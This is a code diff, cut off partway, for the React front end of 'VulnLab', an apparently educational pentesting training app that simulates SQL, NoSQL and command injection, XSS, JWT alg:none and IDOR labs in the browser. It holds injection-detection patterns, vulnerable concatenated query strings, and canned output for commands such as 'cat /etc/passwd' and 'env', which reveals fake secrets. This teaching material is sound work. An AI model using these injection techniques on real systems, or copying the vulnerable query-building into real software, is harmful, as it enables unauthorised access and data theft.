@@ -1,0 +1,1593 @@
+import { useState, useEffect, useRef, useCallback } from "react";
+
+// ============================================================
+// VULNLAB — Pentesting Training Platform
+// All labs run 100% in-browser via simulated backend logic
+// ============================================================
+
+const FONT = `@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700;800&family=Syne:wght@400;600;700;800&display=swap');`;
+
+// ─── Simulated "backend" responses for each lab ───────────────
+const simulateSQL = (endpoint, params) => {
+  if (endpoint === "login") {
+    const { username, password } = params;
+    const isInjection =
+      username.includes("'") ||
+      username.toLowerCase().includes(" or ") ||
+      username.includes("--") ||
+      username.includes("#");
+    if (isInjection) {
+      const query = `SELECT * FROM users WHERE username='${username}' AND password=MD5('${password}')`;
+      return {
+        success: true,
+        user: { id: 1, username: "admin", role: "admin" },
+        flag: "FLAG{sql_login_bypass_classic}",
+        debug_query: query,
+        explanation:
+          "Your injection made the WHERE clause always TRUE. The -- comment cancelled the password check entirely.",
+      };
+    }
+    if (username === "admin" && password === "admin123") {
+      return { success: true, user: { id: 1, username: "admin", role: "admin" }, debug_query: `SELECT * FROM users WHERE username='admin' AND password=MD5('admin123')` };
+    }
+    return { success: false, message: "Invalid credentials", debug_query: `SELECT * FROM users WHERE username='${username}' AND password=MD5('${password}')` };
+  }
+  if (endpoint === "search") {
+    const { q } = params;
+    const isUnion = q.toLowerCase().includes("union");
+    const isComment = q.includes("--") || q.includes("#");
+    if (isUnion && isComment) {
+      return {
+        results: [
+          { id: 1, name: "admin", password: "0192023a7bbd73250516f069df18b500", email: "admin@vulncorp.io", role: "admin" },
+          { id: 2, name: "john", password: "482c811da5d5b4bc6d497ffa98491e38", email: "john@vulncorp.io", role: "user" },
+          { id: 3, name: "alice", password: "c9dfe4f23a05c9bb7c1b7b3aefaa9c2e", email: "alice@vulncorp.io", role: "user" },
+        ],
+        flag: "FLAG{sql_union_success}",
+        query: `SELECT id, name, description, price, category FROM products WHERE name LIKE '%${q}%'`,
+        explanation: "UNION SELECT appended your query, dumping the users table alongside normal results.",
+      };
+    }
+    return {
+      results: [
+        { id: 1, name: "VulnLab Pro", description: "Premium subscription", price: 99.99, category: "software" },
+        { id: 2, name: "Exploit Kit", description: "Security toolkit", price: 49.99, category: "software" },
+      ],
+      query: `SELECT id, name, description, price, category FROM products WHERE name LIKE '%${q}%'`,
+    };
+  }
+  if (endpoint === "blind") {
+    const { id } = params;
+    const isBlind = id.toLowerCase().includes("substring") || id.toLowerCase().includes("select");
+    if (isBlind) {
+      return { found: true, flag: "FLAG{blind_sqli_master}", explanation: "Boolean-based blind extraction confirmed — you're reading DB data character by character!" };
+    }
+    if (id === "1" || id === "2" || id === "3") return { found: true };
+    return { found: false };
+  }
+  return {};
+};
+
+const simulateNoSQL = (params) => {
+  const { username, password } = params;
+  if (typeof password === "object" && password !== null) {
+    if ("$ne" in password || "$gt" in password || "$regex" in password) {
+      return {
+        success: true,
+        user: { username: "admin", role: "admin" },
+        flag: "FLAG{nosql_operator_injection}",
+        explanation: `MongoDB received: {username: "${username}", password: ${JSON.stringify(password)}}. The $ne operator matched ANY non-empty password — auth bypassed!`,
+      };
+    }
+  }
+  if (username === "admin" && password === "admin123") return { success: true, user: { username: "admin", role: "admin" } };
+  return { success: false, message: "Invalid credentials" };
+};
+
+const simulateCmd = (ip) => {
+  const chains = [";", "&&", "||", "|", "`", "$("];
+  const hasChain = chains.some((c) => ip.includes(c));
+  if (hasChain) {
+    const parts = ip.split(/[;&|`$()]+/).map((s) => s.trim()).filter(Boolean);
+    const injected = parts.slice(1).join("; ") || "whoami";
+    const outputs = {
+      whoami: "www-data",
+      id: "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+      "cat /etc/passwd": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n...[truncated]",
+      "cat /flag.txt": "FLAG{cmd_injection_rce}",
+      ls: "bin  boot  dev  etc  flag.txt  home  lib  media  mnt  opt  proc  root  run  srv  sys  tmp  usr  var",
+      pwd: "/var/www/html",
+      env: "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin\nDB_PASSWORD=vulnlab_root_password\nJWT_SECRET=supersecretkey123\nAPI_KEY=sk-1234567890abcdef",
+      uname: "Linux vulnlab-backend 5.15.0 #1 SMP x86_64 GNU/Linux",
+    };
+    const cmdKey = Object.keys(outputs).find((k) => injected.includes(k)) || "whoami";
+    return {
+      output: `PING 127.0.0.1 (127.0.0.1): 56 data bytes\n64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.042 ms\n\n--- ping statistics ---\n\n$ ${injected}\n${outputs[cmdKey]}`,
+      command: `ping -c 2 ${ip}`,
+      flag: injected.includes("flag.txt") || injected.includes("env") ? "FLAG{cmd_injection_rce}" : undefined,
+      explanation: `Shell metacharacter '${chains.find((c) => ip.includes(c))}' chained a new OS command after the ping.`,
+    };
+  }
+  return {
+    output: `PING ${ip} (${ip}): 56 data bytes\n64 bytes from ${ip}: icmp_seq=0 ttl=64 time=0.412 ms\n64 bytes from ${ip}: icmp_seq=1 ttl=64 time=0.381 ms\n\n--- ${ip} ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss`,
+    command: `ping -c 2 ${ip}`,
+  };
+};
+
+const simulateXSS = (type, input) => {
+  const hasScript = input.includes("<script") || input.includes("onerror") || input.includes("javascript:");
+  const hasEvent = /on\w+\s*=/i.test(input);
+  const isXSS = hasScript || hasEvent;
+  if (type === "stored") {
+    if (isXSS) return { stored: true, content: input, flag: "FLAG{stored_xss_achieved}", explanation: "Your payload is now stored in the database. Every user who views this page will execute your script." };
+    return { stored: true, content: input };
+  }
+  if (type === "reflected") {
+    if (isXSS) return { reflected: true, html: `<p>Search results for: ${input}</p>`, flag: "FLAG{reflected_xss_achieved}", explanation: "Your input was reflected directly into HTML without encoding. Share this URL with any user to execute code in their browser." };
+    return { reflected: true, html: `<p>Search results for: ${input}</p>` };
+  }
+  return {};
+};
+
+const simulateJWT = (token) => {
+  try {
+    const parts = token.split(".");
+    if (parts.length < 2) return { error: "Invalid JWT format" };
+    const header = JSON.parse(atob(parts[0].replace(/-/g, "+").replace(/_/g, "/")));
+    const payload = JSON.parse(atob(parts[1].replace(/-/g, "+").replace(/_/g, "/")));
+    if (header.alg === "none" || header.alg === "None") {
+      if (payload.role === "admin" || payload.isAdmin) {
+        return { access: "GRANTED", flag: "FLAG{jwt_alg_none_bypass}", user: payload, explanation: "The server accepted your unsigned token because it didn't validate the 'alg' field. By setting alg:none you removed signature verification entirely." };
+      }
+      return { error: "Token accepted (alg:none) but role is not admin. Change payload role to 'admin'." };
+    }
+    return { error: `Token uses alg:${header.alg}. Change the algorithm to 'none' and role to 'admin'.`, decoded: { header, payload } };
+  } catch {
+    return { error: "Could not decode token. Ensure valid base64." };
+  }
+};
+
+const simulateIDOR = (userId, docId) => {
+  const docs = {
+    1: { id: 1, owner_id: 1, owner: "admin", filename: "admin_report.pdf", content: "Q3 Revenue: $2.4M | FLAG{idor_document_access}", classification: "TOP SECRET" },
+    2: { id: 2, owner_id: 2, owner: "john", filename: "john_contract.pdf", content: "Salary: $95,000/yr | SSN: 987-65-4321" },
+    3: { id: 3, owner_id: 3, owner: "alice", filename: "alice_notes.txt", content: "Project Phoenix — internal only" },
+    4: { id: 4, owner_id: 4, owner: "bob", filename: "bob_invoice.pdf", content: "Invoice #4421 — $12,400" },
+  };
+  const doc = docs[docId];
+  if (!doc) return { error: "Document not found" };
+  const isIDOR = doc.owner_id !== parseInt(userId);
+  return {
+    document: doc,
+    accessed_as: `user_${userId}`,
+    ...(isIDOR && { flag: "FLAG{idor_document_access}", warning: `⚠️ You accessed user ${doc.owner_id}'s private document as user ${userId}!`, explanation: "The server never checked if the requested document ID belongs to the authenticated user." }),
+  };
+};
+
+// ─── Lab definitions ──────────────────────────────────────────
+const LABS = [
+  { id: "sqli", icon: "💉", title: "SQL Injection", category: "Injection", difficulty: "beginner", points: 350, challenges: 3, color: "#ff4444", desc: "Classic SQLi, UNION extraction, blind boolean attacks" },
+  { id: "nosql", icon: "🍃", title: "NoSQL Injection", category: "Injection", difficulty: "intermediate", points: 150, challenges: 2, color: "#ff8800", desc: "MongoDB operator injection — $ne, $regex auth bypass" },
+  { id: "cmdi", icon: "💀", title: "Command Injection", category: "Injection", difficulty: "intermediate", points: 200, challenges: 2, color: "#ff4444", desc: "OS command injection via shell metacharacters" },
+  { id: "xss", icon: "📜", title: "Cross-Site Scripting", category: "Client-Side", difficulty: "beginner", points: 200, challenges: 3, color: "#aa44ff", desc: "Stored, reflected, and DOM-based XSS attacks" },
+  { id: "jwt", icon: "🪙", title: "JWT Manipulation", category: "Auth & AuthZ", difficulty: "advanced", points: 250, challenges: 2, color: "#00aaff", desc: "Algorithm confusion (alg:none), weak secret cracking" },
+  { id: "idor", icon: "🔓", title: "IDOR", category: "Auth & AuthZ", difficulty: "beginner", points: 150, challenges: 2, color: "#00ff88", desc: "Access other users' private documents via ID manipulation" },
+  { id: "csrf", icon: "🛡️", title: "CSRF", category: "Web Security", difficulty: "beginner", points: 100, challenges: 1, color: "#ffaa00", desc: "Cross-site request forgery with auto-submit PoC" },
+  { id: "misconfig", icon: "⚙️", title: "Misconfigurations", category: "Misconfiguration", difficulty: "beginner", points: 130, challenges: 4, color: "#888888", desc: "Debug endpoints, .env exposure, directory listing" },
+];
+
+// ─── Styles ───────────────────────────────────────────────────
+const css = `
+${FONT}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { background: #080c14; color: #c9d4e8; font-family: 'JetBrains Mono', monospace; }
+
+::-webkit-scrollbar { width: 4px; height: 4px; }
+::-webkit-scrollbar-track { background: #080c14; }
+::-webkit-scrollbar-thumb { background: #1e2d4a; border-radius: 2px; }
+
+@keyframes scan {
+  0% { transform: translateY(-100%); }
+  100% { transform: translateY(100vh); }
+}
+@keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+@keyframes fadeUp { from{opacity:0;transform:translateY(16px)} to{opacity:1;transform:translateY(0)} }
+@keyframes glitch {
+  0%,100%{text-shadow:none}
+  20%{text-shadow:-2px 0 #ff4444,2px 0 #00aaff}
+  40%{text-shadow:2px 0 #ff4444,-2px 0 #00aaff}
+  60%{text-shadow:none}
+}
+@keyframes pulse { 0%,100%{box-shadow:0 0 0 0 rgba(0,255,136,.3)} 50%{box-shadow:0 0 0 8px rgba(0,255,136,0)} }
+@keyframes matrixDrop { 0%{opacity:0;transform:translateY(-20px)} 100%{opacity:1;transform:translateY(0)} }
+@keyframes flagReveal {
+  0%{letter-spacing:-0.5em;opacity:0}
+  60%{letter-spacing:0.15em;opacity:1}
+  100%{letter-spacing:0.05em}
+}
+@keyframes spin { from{transform:rotate(0deg)} to{transform:rotate(360deg)} }
+
+.app { display:flex; flex-direction:column; min-height:100vh; position:relative; overflow:hidden; }
+
+/* Noise texture overlay */
+.app::before {
+  content:''; position:fixed; inset:0; pointer-events:none; z-index:0;
+  background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.03'/%3E%3C/svg%3E");
+  opacity: 0.4;
+}
+
+/* Grid lines */
+.app::after {
+  content:''; position:fixed; inset:0; pointer-events:none; z-index:0;
+  background-image: linear-gradient(rgba(0,255,136,.015) 1px, transparent 1px), linear-gradient(90deg, rgba(0,255,136,.015) 1px, transparent 1px);
+  background-size: 40px 40px;
+}
+
+.content { position:relative; z-index:1; }
+
+/* NAV */
+.nav {
+  position: sticky; top:0; z-index:100;
+  display:flex; align-items:center; gap:0; height:52px;
+  background: rgba(8,12,20,.92); backdrop-filter:blur(12px);
+  border-bottom: 1px solid #0f1e32;
+  padding: 0 1.5rem;
+}
+.nav-logo {
+  font-family:'Syne',sans-serif; font-weight:800; font-size:1.1rem;
+  color:#00ff88; letter-spacing:-.02em; margin-right:2rem;
+  text-shadow: 0 0 20px rgba(0,255,136,.4);
+  flex-shrink:0;
+}
+.nav-logo span { color:#ff4444; }
+.nav-tabs { display:flex; gap:2px; flex:1; }
+.nav-tab {
+  padding:.35rem .875rem; border-radius:5px; cursor:pointer;
+  font-size:.72rem; font-weight:500; color:#566070; transition:all .15s;
+  border:none; background:none; font-family:inherit; letter-spacing:.03em;
+}
+.nav-tab:hover { color:#8899aa; background:rgba(255,255,255,.04); }
+.nav-tab.active { color:#00ff88; background:rgba(0,255,136,.08); }
+.nav-right { display:flex; align-items:center; gap:.75rem; margin-left:auto; }
+.nav-pts {
+  font-size:.72rem; color:#ffa502; background:rgba(255,165,2,.1);
+  border:1px solid rgba(255,165,2,.2); border-radius:4px; padding:.2rem .5rem;
+}
+.nav-user { font-size:.72rem; color:#00ff88; }
+
+/* HERO */
+.hero {
+  padding: 5rem 2rem 3rem; text-align:center;
+  animation: fadeUp .6s ease;
+}
+.hero-tag {
+  display:inline-block; font-size:.65rem; color:#ff4444; letter-spacing:.15em;
+  border:1px solid rgba(255,68,68,.3); background:rgba(255,68,68,.06);
+  padding:.3rem .75rem; border-radius:3px; margin-bottom:1.75rem;
+  animation: blink 2s ease infinite;
+}
+.hero h1 {
+  font-family:'Syne',sans-serif; font-weight:800;
+  font-size:clamp(2.5rem,6vw,4.5rem); line-height:1.05;
+  color:#e8f0ff; margin-bottom:1.25rem;
+  animation: glitch 8s ease infinite;
+}
+.hero h1 em { font-style:normal; color:#00ff88; }
+.hero p { font-size:.9rem; color:#566070; max-width:540px; margin:0 auto 2.5rem; line-height:1.8; }
+.hero-btns { display:flex; gap:.75rem; justify-content:center; flex-wrap:wrap; }
+.btn {
+  padding:.65rem 1.5rem; border-radius:5px; font-size:.78rem;
+  font-weight:600; cursor:pointer; transition:all .15s;
+  font-family:'JetBrains Mono',monospace; letter-spacing:.03em;
+  border:none; display:inline-flex; align-items:center; gap:.4rem;
+}
+.btn-green { background:#00ff88; color:#080c14; }
+.btn-green:hover { background:#00e87c; box-shadow:0 0 24px rgba(0,255,136,.35); transform:translateY(-1px); }
+.btn-ghost { background:transparent; color:#00ff88; border:1px solid rgba(0,255,136,.3); }
+.btn-ghost:hover { background:rgba(0,255,136,.07); }
+.btn-red { background:rgba(255,68,68,.12); color:#ff4444; border:1px solid rgba(255,68,68,.25); }
+.btn-red:hover { background:rgba(255,68,68,.2); }
+.btn-blue { background:rgba(0,170,255,.12); color:#00aaff; border:1px solid rgba(0,170,255,.25); }
+.btn-blue:hover { background:rgba(0,170,255,.2); }
+.btn-sm { padding:.4rem .875rem; font-size:.7rem; }
+.btn:disabled { opacity:.45; cursor:not-allowed; transform:none !important; box-shadow:none !important; }
+
+/* STATS BAR */
+.stats-bar {
+  display:flex; justify-content:center; gap:3rem;
+  padding:2rem 0 3rem; border-top:1px solid #0f1e32;
+  animation: fadeUp .6s ease .2s backwards;
+}
+.stat-item { text-align:center; }
+.stat-val { font-family:'Syne',sans-serif; font-size:2rem; font-weight:800; color:#00ff88; }
+.stat-lbl { font-size:.65rem; color:#3a4a5a; letter-spacing:.1em; text-transform:uppercase; margin-top:.2rem; }
+
+/* LAB GRID */
+.labs-grid {
+  display:grid; grid-template-columns:repeat(auto-fill,minmax(280px,1fr));
+  gap:1px; background:#0f1e32;
+  border:1px solid #0f1e32; border-radius:8px; overflow:hidden;
+}
+.lab-card {
+  background:#080c14; padding:1.5rem; cursor:pointer;
+  transition:all .2s; position:relative; overflow:hidden;
+}
+.lab-card::before {
+  content:''; position:absolute; inset:0;
+  background:linear-gradient(135deg,rgba(0,255,136,.04) 0%,transparent 60%);
+  opacity:0; transition:opacity .2s;
+}
+.lab-card:hover { background:#0c1220; }
+.lab-card:hover::before { opacity:1; }
+.lab-card-top { display:flex; justify-content:space-between; margin-bottom:1rem; }
+.lab-icon { font-size:1.75rem; }
+.lab-pts { font-size:.7rem; color:#ffa502; font-weight:700; }
+.lab-pts-num { font-size:1rem; }
+.lab-title { font-family:'Syne',sans-serif; font-weight:700; font-size:.95rem; color:#c9d4e8; margin-bottom:.4rem; }
+.lab-desc { font-size:.72rem; color:#3a4a5a; line-height:1.6; margin-bottom:1rem; }
+.lab-footer { display:flex; justify-content:space-between; align-items:center; }
+.badge {
+  font-size:.62rem; font-weight:700; padding:.18rem .5rem;
+  border-radius:3px; letter-spacing:.06em; text-transform:uppercase;
+}
+.badge-beginner { background:rgba(0,255,136,.1); color:#00ff88; border:1px solid rgba(0,255,136,.2); }
+.badge-intermediate { background:rgba(255,165,2,.1); color:#ffa502; border:1px solid rgba(255,165,2,.2); }
+.badge-advanced { background:rgba(255,68,68,.1); color:#ff4444; border:1px solid rgba(255,68,68,.2); }
+.lab-challenges { font-size:.65rem; color:#3a4a5a; }
+
+/* LAB VIEW */
+.lab-view { animation: fadeUp .3s ease; }
+.lab-header {
+  padding:2rem 2rem 1.5rem; border-bottom:1px solid #0f1e32;
+  display:flex; align-items:flex-start; gap:1.5rem;
+}
+.lab-back {
+  background:none; border:none; color:#3a4a5a; cursor:pointer;
+  font-family:inherit; font-size:.75rem; padding:.5rem;
+  border-radius:4px; transition:color .15s;
+}
+.lab-back:hover { color:#c9d4e8; }
+.lab-header-info { flex:1; }
+.lab-header-title { font-family:'Syne',sans-serif; font-weight:800; font-size:1.5rem; color:#e8f0ff; margin-bottom:.5rem; }
+.lab-header-desc { font-size:.8rem; color:#566070; line-height:1.7; max-width:600px; }
+.lab-meta { display:flex; gap:.75rem; margin-top:.75rem; align-items:center; }
+
+/* CHALLENGE TABS */
+.challenge-tabs { display:flex; border-bottom:1px solid #0f1e32; }
+.challenge-tab {
+  padding:.875rem 1.5rem; font-size:.73rem; cursor:pointer;
+  border-bottom:2px solid transparent; transition:all .15s;
+  color:#3a4a5a; background:none; border-left:none; border-right:none; border-top:none;
+  font-family:inherit;
+}
+.challenge-tab:hover { color:#8899aa; }
+.challenge-tab.active { color:#00ff88; border-bottom-color:#00ff88; }
+.challenge-tab.solved { color:#00ff88; }
+.challenge-tab.solved::after { content:' ✓'; font-size:.65rem; }
+
+/* SPLIT LAYOUT */
+.lab-split { display:grid; grid-template-columns:1fr 1fr; gap:0; min-height:500px; }
+.lab-left { padding:1.75rem; border-right:1px solid #0f1e32; }
+.lab-right { padding:1.75rem; display:flex; flex-direction:column; gap:1rem; }
+
+.section-title {
+  font-size:.65rem; color:#3a4a5a; letter-spacing:.12em;
+  text-transform:uppercase; margin-bottom:.875rem;
+  display:flex; align-items:center; gap:.5rem;
+}
+.section-title::before { content:''; width:20px; height:1px; background:#1e2d4a; }
+
+/* Input group */
+.input-group { margin-bottom:.875rem; }
+.input-label { display:block; font-size:.65rem; color:#566070; letter-spacing:.08em; text-transform:uppercase; margin-bottom:.4rem; }
+.input {
+  width:100%; background:#060a10; border:1px solid #1e2d4a;
+  border-radius:4px; padding:.6rem .875rem; color:#c9d4e8;
+  font-family:'JetBrains Mono',monospace; font-size:.8rem;
+  outline:none; transition:border-color .15s;
+}
+.input:focus { border-color:rgba(0,255,136,.4); background:#080c14; }
+.input::placeholder { color:#1e2d4a; }
+select.input { cursor:pointer; }
+
+/* Terminal */
+.terminal {
+  background:#040710; border:1px solid #1e2d4a; border-radius:6px;
+  font-family:'JetBrains Mono',monospace; font-size:.75rem;
+  overflow:hidden; flex:1;
+}
+.terminal-bar {
+  background:#0c1220; padding:.5rem .875rem;
+  display:flex; align-items:center; gap:.4rem;
+  border-bottom:1px solid #1e2d4a;
+}
+.terminal-dot { width:8px; height:8px; border-radius:50%; }
+.terminal-body { padding:.875rem; min-height:180px; max-height:320px; overflow-y:auto; }
+.terminal-line { margin-bottom:.3rem; line-height:1.5; }
+.t-prompt { color:#3a4a5a; }
+.t-cmd { color:#c9d4e8; }
+.t-out { color:#566070; }
+.t-success { color:#00ff88; }
+.t-error { color:#ff4444; }
+.t-warn { color:#ffa502; }
+.t-flag { color:#ffa502; font-weight:700; animation:flagReveal .6s ease forwards; letter-spacing:.05em; }
+.t-info { color:#00aaff; }
+.t-cursor { display:inline-block; width:8px; height:1em; background:#00ff88; animation:blink 1s step-end infinite; vertical-align:text-bottom; }
+
+/* Code block */
+.code-box {
+  background:#040710; border:1px solid #1e2d4a; border-radius:6px;
+  overflow:hidden;
+}
+.code-box-header {
+  background:#0c1220; padding:.45rem .875rem;
+  display:flex; justify-content:space-between; align-items:center;
+  border-bottom:1px solid #1e2d4a; font-size:.65rem;
+}
+.code-box-lang { color:#3a4a5a; letter-spacing:.06em; }
+.code-box-label-vuln { color:#ff4444; }
+.code-box-label-safe { color:#00ff88; }
+.code-box-body { padding:.875rem; font-size:.73rem; line-height:1.7; overflow-x:auto; white-space:pre; }
+.c-comment { color:#2a3a4a; }
+.c-vuln { color:#ff4444; }
+.c-safe { color:#00ff88; }
+.c-str { color:#ffa502; }
+.c-kw { color:#00aaff; }
+.c-fn { color:#aa88ff; }
+
+/* Hints */
+.hint-list { display:flex; flex-direction:column; gap:.4rem; }
+.hint-item {
+  background:rgba(255,165,2,.04); border:1px solid rgba(255,165,2,.12);
+  border-radius:4px; padding:.6rem .875rem; font-size:.75rem;
+  color:#ffa502; cursor:pointer; transition:all .15s;
+  display:flex; align-items:center; gap:.5rem;
+}
+.hint-item:hover { background:rgba(255,165,2,.08); }
+.hint-item.locked { color:#2a3a4a; border-color:#0f1e32; cursor:pointer; }
+.hint-item.locked:hover { border-color:rgba(255,165,2,.12); color:#3a4a5a; }
+
+/* Flag reveal */
+.flag-box {
+  background:linear-gradient(135deg,rgba(0,255,136,.08),rgba(0,170,255,.05));
+  border:1px solid rgba(0,255,136,.3); border-radius:6px; padding:1rem 1.25rem;
+  animation:pulse 2s ease infinite;
+}
+.flag-label { font-size:.62rem; color:#3a4a5a; letter-spacing:.1em; text-transform:uppercase; margin-bottom:.4rem; }
+.flag-value { font-size:.9rem; color:#00ff88; font-weight:700; word-break:break-all; }
+
+/* Explanation box */
+.explain-box {
+  background:rgba(0,170,255,.04); border:1px solid rgba(0,170,255,.15);
+  border-radius:6px; padding:.875rem 1rem; font-size:.75rem; color:#8899aa; line-height:1.7;
+}
+.explain-box strong { color:#00aaff; }
+
+/* Objective */
+.objective {
+  background:rgba(0,170,255,.04); border-left:2px solid #00aaff;
+  padding:.75rem 1rem; font-size:.78rem; color:#8899aa; line-height:1.6;
+  margin-bottom:1.25rem; border-radius:0 4px 4px 0;
+}
+.objective strong { color:#00aaff; display:block; font-size:.65rem; letter-spacing:.1em; text-transform:uppercase; margin-bottom:.3rem; }
+
+/* Progress */
+.progress-bar-track { background:#0f1e32; border-radius:99px; height:4px; overflow:hidden; }
+.progress-bar-fill { height:100%; background:linear-gradient(90deg,#00ff88,#00aaff); border-radius:99px; transition:width .5s ease; }
+
+/* Dashboard */
+.dash-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(160px,1fr)); gap:1px; background:#0f1e32; border:1px solid #0f1e32; border-radius:8px; overflow:hidden; }
+.dash-stat { background:#080c14; padding:1.25rem; text-align:center; }
+.dash-stat-val { font-family:'Syne',sans-serif; font-size:1.75rem; font-weight:800; color:#00ff88; }
+.dash-stat-lbl { font-size:.65rem; color:#3a4a5a; text-transform:uppercase; letter-spacing:.1em; margin-top:.25rem; }
+
+/* Leaderboard */
+.lb-row { display:flex; align-items:center; gap:.75rem; padding:.6rem 0; border-bottom:1px solid #0f1e32; }
+.lb-rank { font-size:.7rem; color:#3a4a5a; min-width:1.5rem; }
+.lb-name { font-size:.8rem; flex:1; }
+.lb-pts { font-size:.75rem; color:#ffa502; font-weight:700; }
+
+/* Warning banner */
+.warn-banner {
+  background:rgba(255,68,68,.06); border-bottom:1px solid rgba(255,68,68,.15);
+  padding:.4rem 1.5rem; text-align:center;
+  font-size:.65rem; color:rgba(255,68,68,.7); letter-spacing:.06em;
+}
+
+/* Achievements */
+.ach-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(130px,1fr)); gap:.75rem; }
+.ach-item {
+  background:#0c1220; border:1px solid #0f1e32; border-radius:6px;
+  padding:1rem; text-align:center; transition:all .2s;
+}
+.ach-item.unlocked { border-color:rgba(0,255,136,.2); background:rgba(0,255,136,.04); }
+.ach-icon { font-size:1.5rem; margin-bottom:.4rem; }
+.ach-name { font-size:.68rem; color:#566070; font-weight:600; }
+.ach-item.unlocked .ach-name { color:#00ff88; }
+
+/* Misc */
+.divider { height:1px; background:#0f1e32; margin:0; }
+.container { max-width:1100px; margin:0 auto; padding:0 1.5rem; }
+.section { padding:2rem 0; }
+.tag { font-size:.65rem; color:#3a4a5a; letter-spacing:.1em; text-transform:uppercase; margin-bottom:.5rem; font-family:'Syne',sans-serif; }
+.spinning { animation:spin 1s linear infinite; display:inline-block; }
+
+@media(max-width:768px){
+  .lab-split{grid-template-columns:1fr}
+  .lab-right{border-top:1px solid #0f1e32}
+  .stats-bar{gap:1.5rem; flex-wrap:wrap}
+  .labs-grid{grid-template-columns:1fr}
+}
+`;
+
+// ─── Matrix Rain Background ───────────────────────────────────
+function MatrixRain() {
+  const ref = useRef(null);
+  useEffect(() => {
+    const c = ref.current;
+    if (!c) return;
+    const ctx = c.getContext("2d");
+    const resize = () => { c.width = window.innerWidth; c.height = window.innerHeight; };
+    resize();
+    window.addEventListener("resize", resize);
+    const chars = "01SQLXSSRCE{}[]'--INJECT";
+    const cols = Math.floor(c.width / 16);
+    const drops = Array(cols).fill(0);
+    let frame;
+    const draw = () => {
+      ctx.fillStyle = "rgba(8,12,20,.07)";
+      ctx.fillRect(0, 0, c.width, c.height);
+      ctx.font = "11px JetBrains Mono";
+      for (let i = 0; i < drops.length; i++) {
+        ctx.fillStyle = `rgba(0,255,136,${Math.random() * 0.12})`;
+        ctx.fillText(chars[Math.floor(Math.random() * chars.length)], i * 16, drops[i] * 16);
+        if (drops[i] * 16 > c.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+      }
+      frame = requestAnimationFrame(draw);
+    };
+    draw();
+    return () => { window.removeEventListener("resize", resize); cancelAnimationFrame(frame); };
+  }, []);
+  return <canvas ref={ref} style={{ position: "fixed", top: 0, left: 0, zIndex: 0, opacity: 0.35, pointerEvents: "none" }} />;
+}
+
+// ─── Terminal component ───────────────────────────────────────
+function Terminal({ lines, loading }) {
+  const bodyRef = useRef(null);
+  useEffect(() => { if (bodyRef.current) bodyRef.current.scrollTop = bodyRef.current.scrollHeight; }, [lines]);
+  return (
+    <div className="terminal">
+      <div className="terminal-bar">
+        <div className="terminal-dot" style={{ background: "#ff4444" }} />
+        <div className="terminal-dot" style={{ background: "#ffa502" }} />
+        <div className="terminal-dot" style={{ background: "#00ff88" }} />
+        <span style={{ fontSize: ".65rem", color: "#2a3a4a", marginLeft: ".5rem" }}>vulnlab://terminal</span>
+      </div>
+      <div className="terminal-body" ref={bodyRef}>
+        {lines.map((l, i) => (
+          <div key={i} className="terminal-line">
+            {l.type === "prompt" && <><span className="t-prompt">vulnlab $ </span><span className="t-cmd">{l.text}</span></>}
+            {l.type === "out" && <span className="t-out">{l.text}</span>}
+            {l.type === "success" && <span className="t-success">✓ {l.text}</span>}
+            {l.type === "error" && <span className="t-error">✗ {l.text}</span>}
+            {l.type === "warn" && <span className="t-warn">⚠ {l.text}</span>}
+            {l.type === "flag" && <span className="t-flag">🚩 {l.text}</span>}
+            {l.type === "info" && <span className="t-info">→ {l.text}</span>}
+            {l.type === "json" && <span className="t-out" style={{ whiteSpace: "pre-wrap", wordBreak: "break-all" }}>{l.text}</span>}
+          </div>
+        ))}
+        {loading && <div className="terminal-line"><span className="t-prompt">vulnlab $ </span><span className="t-cursor" /></div>}
+      </div>
+    </div>
+  );
+}
+
+// ─── Code block ───────────────────────────────────────────────
+function CodeBox({ label, code, variant = "vuln" }) {
+  const [show, setShow] = useState(false);
+  return (
+    <div>
+      <button onClick={() => setShow(!show)} className="btn btn-sm" style={{ width: "100%", justifyContent: "space-between", marginBottom: show ? ".5rem" : 0, background: variant === "vuln" ? "rgba(255,68,68,.07)" : "rgba(0,255,136,.07)", color: variant === "vuln" ? "#ff4444" : "#00ff88", border: `1px solid ${variant === "vuln" ? "rgba(255,68,68,.2)" : "rgba(0,255,136,.2)"}` }}>
+        <span>{variant === "vuln" ? "⚠️" : "✅"} {label}</span>
+        <span style={{ fontSize: ".65rem" }}>{show ? "▲" : "▼"}</span>
+      </button>
+      {show && (
+        <div className="code-box">
+          <div className="code-box-header">
+            <span className="code-box-lang">javascript</span>
+            <span className={variant === "vuln" ? "code-box-label-vuln" : "code-box-label-safe"}>{variant === "vuln" ? "VULNERABLE" : "SECURE FIX"}</span>
+          </div>
+          <pre className="code-box-body" style={{ color: "#8899aa" }} dangerouslySetInnerHTML={{ __html: code }} />
+        </div>
+      )}
+    </div>
+  );
+}
+
+// ─── Hint system ──────────────────────────────────────────────
+function Hints({ hints }) {
+  const [revealed, setRevealed] = useState(-1);
+  return (
+    <div>
+      <div className="section-title">Hints ({hints.length})</div>
+      <div className="hint-list">
+        {hints.map((h, i) => (
+          <div key={i} className={`hint-item ${i > revealed ? "locked" : ""}`} onClick={() => setRevealed(Math.max(revealed, i))}>
+            {i > revealed ? <><span>🔒</span><span>Hint #{i + 1} — click to reveal</span></> : <><span>💡</span><span>{h}</span></>}
+          </div>
+        ))}
+      </div>
+    </div>
+  );
+}
+
+// ═══════════════════════════════════════════════════════════════
+// LAB COMPONENTS
+// ═══════════════════════════════════════════════════════════════
+
+function SQLInjectionLab({ onSolve, solved }) {
+  const [tab, setTab] = useState(0);
